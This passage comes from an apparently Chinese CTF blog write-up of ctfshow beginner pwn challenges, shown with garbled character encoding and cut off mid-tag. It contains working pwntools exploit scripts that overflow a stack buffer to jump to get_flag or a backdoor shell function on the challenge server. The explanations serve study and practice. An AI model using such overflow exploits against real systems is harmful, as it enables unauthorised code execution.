	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/102_hu_1ea758b340b9373a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/102_hu_c4eefe935b6b6cf7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;main-IDAçš„åˆ†æ&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;242&#34;
		data-flex-basis=&#34;581px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™é¢˜å¼€å§‹æ€ªæ€ªçš„ï¼Œæ‰¾ä¸åˆ°/bin/shçš„åé—¨ï¼Œsigsegv_handler å‡½æ•°æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„flagï¼Œä¸è¿‡åœ¨å·¦è¾¹å‡½æ•°ç›®å½•çœ‹åˆ°ç†Ÿæ‚‰çš„æ•…äººâ€”â€”get_flagå‡½æ•°ï¼Œç›´æ¥è·Ÿè¿›çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/103.png&#34;
	width=&#34;961&#34;
	height=&#34;289&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/103_hu_ec17c27209d749fe.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/103_hu_ed5b527b98ddfd0f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;è·Ÿè¿›get_flagå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;332&#34;
		data-flex-basis=&#34;798px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„fgetsè¯»å–å’Œè¿”å›çš„printf(s)æ‰“å°å‡½æ•°ï¼Œè¾“å‡ºflagå­—ç¬¦ä¸²ï¼Œä¸»å‡½æ•°æ²¡æœ‰å¼•ç”¨å®ƒå•Šï¼Œæ€ä¹ˆåŠï¼Ÿæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´è¦†ç›–è¿”å›åœ°å€ï¼Œå°†ç¨‹åºçš„æ‰§è¡Œæµç¨‹è½¬å‘ get_flag å‡½æ•°ï¼Œä»è€Œè·å–flagã€‚ï¼ˆå¯ä»¥ç”¨ret2shellcodeã€ret2libcï¼‰&lt;/p&gt;
&lt;p&gt;mainå‡½æ•°çš„çªç ´ç‚¹åœ¨è¿™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/104.png&#34;
	width=&#34;860&#34;
	height=&#34;215&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/104_hu_5cc36469a1fe2e12.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/104_hu_fcf805775837a51c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;åœ¨mainè·Ÿè¿›ctfshowå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;400&#34;
		data-flex-basis=&#34;960px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ²¡å¼€canaryä¿æŠ¤ï¼Œsæ•°ç»„å¯å­˜å‚¨å¤§å°èŒƒå›´æ˜¯36ï¼Œè¶…è¿‡äº†å°±è¦†ç›–è¿”å›åœ°å€äº†ã€‚&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-error&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;gets è¯»å–å‡½æ•°æ˜¯éå¸¸ä¸å®‰å…¨çš„ï¼Œå®¹æ˜“å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å› ä¸ºå®ƒæ— æ³•é™åˆ¶è¾“å…¥çš„é•¿åº¦ï¼Œå¯èƒ½ä¼šè¶…å‡ºs æ•°ç»„çš„å®¹é‡ï¼Œå¯¼è‡´è¦†ç›–æ ˆä¸Šçš„å…¶ä»–æ•°æ®æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™ä¹Ÿæ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œsè·ebpä»…æœ‰0x28ï¼Œè€Œgetsä¸é™åˆ¶è¾“å…¥é•¿åº¦ã€‚&lt;/p&gt;
&lt;p&gt;å®‰å…¨æ€§æ¥çœ‹ä¸€èˆ¬éƒ½ä¼šç”¨fgetså‡½æ•°ï¼Œæ­é…&lt;strong&gt;FORTIFY ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥&lt;/strong&gt;æ¥æé«˜ç¨‹åºè‡ªèº«å®‰å…¨æ€§ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28297&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;get_flag_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;get_flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_flag_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#è¿œç¨‹å‘é€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;#å¼€å¯shelläº¤äº’æ¨¡å¼ï¼ˆç±»ä¼¼ç»ˆç«¯ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;è¿™é‡Œçš„44ä¸ªâ€˜aâ€™æ˜¯0x28 + 4 ï¼Œ0x28ï¼ˆåè¿›åˆ¶ 40ï¼‰æ˜¯ç¼“å†²åŒºåˆ° ebpï¼ˆæ ˆåŸºå€å¯„å­˜å™¨ï¼‰çš„è·ç¦»ï¼Œ+4 æ˜¯è¦†ç›– ebp æœ¬èº«ï¼ˆ32 ä½ç¨‹åºä¸­å¯„å­˜å™¨å  4 å­—èŠ‚ï¼‰ï¼Œæ€»å…± 44 å­—èŠ‚åï¼Œåç»­æ•°æ®æ‰èƒ½è¦†ç›–å‡½æ•°çš„ â€œè¿”å›åœ°å€â€ï¼Œä»è€Œè·³è½¬åˆ° get_flag å‡½æ•°ã€‚å½“ç„¶ä½ å¯ä»¥ç”¨cyclic(0x28 + 4)ï¼Œäº§ç”Ÿ44å­—èŠ‚çš„åƒåœ¾å€¼ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/105.png&#34;
	width=&#34;1130&#34;
	height=&#34;569&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/105_hu_9fe21db2e56fb303.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/105_hu_2f03f58823b9acb.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;198&#34;
		data-flex-basis=&#34;476px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_037&#34;&gt;PWN_037
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š32ä½çš„ system(â€œ/bin/shâ€) åé—¨å‡½æ•°ç»™ä½ ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_037&#34; &gt;PWN_037&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecå‘ç°æ˜¯æœ‰æ— æ ˆæº¢å‡ºä¿æŠ¤çš„ï¼Œå…³äº†canaryã€‚&lt;/p&gt;
&lt;p&gt;IDAåˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/106.png&#34;
	width=&#34;649&#34;
	height=&#34;204&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/106_hu_28baf5c7d68b2e77.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/106_hu_1e83db09825e803f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;318&#34;
		data-flex-basis=&#34;763px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥å‘ç°mainå‡½æ•°æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åœ¨å‡½æ•°ç›®å½•å¯ä»¥çœ‹åˆ°æœ‰ä¸ªbackdoorçš„å‡½æ•°æœ‰çŒ«è…»&amp;hellip;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107.png&#34;
	width=&#34;689&#34;
	height=&#34;309&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_82558c987e30e4e0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;çœŸâ€œåé—¨â€å‡½æ•°â€”â€”backdoor&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;535px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå‡½æ•°å±…ç„¶æœ‰/bin/shï¼ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/108.png&#34;
	width=&#34;685&#34;
	height=&#34;149&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/108_hu_2f6decafcbb4d7a.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/108_hu_13e7ed272ddf4f58.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;459&#34;
		data-flex-basis=&#34;1103px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æœ‰readè¯»å–å‡½æ•°ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä»¥æ­¤ä¸ºæ³¨å…¥ç‚¹ï¼Œç”¨åƒåœ¾å€¼0x12+4å…ˆè¦†ç›–å‡½æ•°å˜é‡å’Œå¯„å­˜å™¨ebpæœ¬èº«ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªåé—¨å‡½æ•°çš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28229&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;backdoor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#åé—¨å‡½æ•°çš„åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/109.png&#34;
	width=&#34;1043&#34;
	height=&#34;460&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/109_hu_5594301dde95ce57.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/109_hu_f2393a4d4b100c98.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;226&#34;
		data-flex-basis=&#34;544px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è„šæœ¬expä¸‡å²ã€‚&lt;/p&gt;
&lt;h3 id=&#34;pwn_038&#34;&gt;PWN_038
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼š64ä½çš„ system(â€œ/bin/shâ€) åé—¨å‡½æ•°ç»™ä½ ã€‚&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/110.png&#34;
	width=&#34;845&#34;
	height=&#34;209&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/110_hu_cc699b9c9e84b874.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/110_hu_818237d793c59893.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;404&#34;
		data-flex-basis=&#34;970px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ²¡å¼€canaryä¿æŠ¤ï¼Œå¼€NXä¿æŠ¤ï¼ˆä¸èƒ½ret2shellcodeï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/111.png&#34;
	width=&#34;653&#34;
	height=&#34;150&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/111_hu_557177fc9847835c.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/111_hu_3e2e3f6328afcdc.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;435&#34;
		data-flex-basis=&#34;1044px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;bufæ•°ç»„è·ç¦»ebpå¯„å­˜å™¨ä¸º0xAhï¼ŒåŠ ä¸Šæœ¬èº«å¯„å­˜å™¨ebpçš„8å­—èŠ‚ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›backdoorå‡½æ•°çœ‹åˆ°/bin/shï¼Œæœ¬é¢˜æ€è·¯å’Œä¸Šé¢˜PWN_037ä¸€æ ·ï¼Œåªä¸è¿‡æ¶æ„å˜æˆ64ä½è€Œå·²ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107.png&#34;
	width=&#34;689&#34;
	height=&#34;309&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/107_hu_82558c987e30e4e0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;ä¸Šé¢˜backdoorå‡½æ•°çš„intç±»å‹&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;535px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/112.png&#34;
	width=&#34;610&#34;
	height=&#34;126&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/112_hu_7a50666a6534a184.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/112_hu_f2c44b968d3f43b7.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æœ¬é¢˜çš„åé—¨å‡½æ•°int_64&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;484&#34;
		data-flex-basis=&#34;1161px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote class=&#34;alert alert-note&#34;&gt;
    &lt;blockquote&gt;
&lt;p&gt;64 ä½ç¨‹åºè°ƒç”¨ &lt;code&gt;system&lt;/code&gt; éœ€è€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œæœ¬è´¨æ˜¯ &lt;strong&gt;64 ä½ ABI å¯¹ â€œæ ˆå¯¹é½â€ çš„ç¡¬æ€§è¦æ±‚&lt;/strong&gt;â€”â€” è‹¥ä¸æ»¡è¶³ï¼Œå‡½æ•°æ‰§è¡Œæ—¶è®¿é—®æ ˆå†…å­˜ä¼šå´©æºƒï¼›è€Œ 32 ä½ ABI æ— æ­¤è¦æ±‚ï¼Œä»…éœ€è°ƒç”¨åæ¸…ç†å‚æ•°æ ˆå³å¯ï¼Œå› æ­¤æ— éœ€é¢å¤–å…³æ³¨å¹³è¡¡ã€‚&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
&lt;p&gt;æ‰€ä»¥è¯´expéœ€è¦è€ƒè™‘åˆ°å †æ ˆå¹³è¡¡åŠ ä¸Šretè¿”å›åœ°å€ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/113.png&#34;
